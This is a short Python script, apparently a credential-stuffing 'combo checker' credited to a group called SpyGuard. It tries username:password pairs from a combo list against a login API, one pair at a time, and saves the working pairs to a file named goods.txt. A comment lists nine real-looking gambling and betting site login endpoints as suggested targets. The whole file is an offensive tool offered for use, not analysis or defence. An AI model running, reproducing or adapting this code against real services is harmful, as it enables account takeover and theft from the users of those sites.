import requests
from colorama import *
import sys
import json
goods_list = ""
'''
    Developed By M3HR4B(@OneProgrammer) and Logan in @SpyGuard
          Contact us with @SpyGuard_Bot
    -------------------------------------------
    Some sites you can use:
    http://game9090.xyz/api/user/auth/login
    http://1sheshobesh.me/api/user/auth/login
    http://manotogames.com/api/user/auth/login
    http://acegame.biz/api/user/auth/login
    http://11dice90.com/api/user/auth/login
    http://bodobet1.com/api/user/auth/login
    http://roll6game.xyz/api/user/auth/login
    http://porroo18.website/api/user/auth/login
    http://picgame.life/api/user/auth/login
'''
def show_alert(alert_type,message):
    if alert_type == "success":
        print('{}[+]{} {}'.format(Fore.GREEN,Fore.RESET,message))
    elif alert_type == "warning":
        print('{}[!]{} {}'.format(Fore.YELLOW,Fore.RESET,message))
    elif alert_type == "danger":
        print('{}[x]{} {}'.format(Fore.RED,Fore.RESET,message))
    else:
        print('{}[@]{} {}'.format(Fore.CYAN,Fore.RESET,message))
def save_result(goods_list):
    result_path = 'goods.txt'
    F = open(result_path,"r")
    saved_combo = str(F.read())
    with open(result_path, 'wb') as fd:
        fd.write("{}{}".format(saved_combo,goods_list))
    show_alert('success','correct username and passwords saved successfully')
while True:
    try:
        site_url = raw_input("[!] please enter site url: ")
        combo_path = raw_input("[!] please enter comno path: ")
        with open(combo_path) as fp:
            line = fp.readline()
            while line:
                combo = line
                combo_array = combo.split(':')
                username = combo_array[0]
                password = combo_array[1].replace("\n",'')
                show_alert('warning',"checking username ({}) with password ({})".format(username,password))
                data = {'mail':username,'pass':password}
                r = requests.post(site_url,params=data)
                
                result = json.loads(r.text)
                result_msg = result['result']
                if result_msg == "error":
                    show_alert('danger','wrong username or password')
                elif result_msg == "ok":
                    show_alert('success','login successfull. [username and password will save]')
                    goods_list += "{}:{}\n".format(username,password)
                line = fp.readline()
        save_result(goods_list)
        break
    except: 
        show_alert('danger','please enter correct combo path')
        pass